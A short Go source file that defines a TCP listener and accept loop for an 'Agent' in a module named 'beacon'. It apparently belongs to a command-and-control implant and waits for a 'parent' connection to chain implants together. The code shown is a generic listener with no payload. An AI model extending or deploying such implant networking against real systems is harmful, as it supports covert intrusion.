package core

import (
	"beacon/pkg/profile"
	"fmt"
	"net"
	"time"
)

func (a *Agent) runInternalTCP() int {
	for a.shouldRunInternal() {
		addr := net.JoinHostPort(
			profile.GlobalProfile.TCPInternal.BindHost,
			fmt.Sprintf("%d", profile.GlobalProfile.TCPInternal.BindPort),
		)
		fmt.Printf("[*] Internal TCP listening on %s\n", addr)

		ln, err := net.Listen("tcp", addr)
		if err != nil {
			fmt.Printf("[!] Internal TCP listen error: %v\n", err)
			a.internalReconnectDelay()
			continue
		}

		conn, err := a.acceptInternalTCP(ln)
		_ = ln.Close()
		if err != nil {
			fmt.Printf("[!] Internal TCP accept error: %v\n", err)
			a.internalReconnectDelay()
			continue
		}
		if conn == nil {
			break
		}

		fmt.Printf("[*] Internal TCP parent connected: %s\n", conn.RemoteAddr())
		_ = a.runInternal(conn)
		a.internalReconnectDelay()
	}
	return 0
}

func (a *Agent) acceptInternalTCP(ln net.Listener) (net.Conn, error) {
	tcpLn, _ := ln.(*net.TCPListener)
	for a.shouldRunInternal() {
		if tcpLn != nil {
			_ = tcpLn.SetDeadline(time.Now().Add(time.Second))
		}

		conn, err := ln.Accept()
		if err == nil {
			return conn, nil
		}
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			continue
		}
		return nil, err
	}
	return nil, nil
}
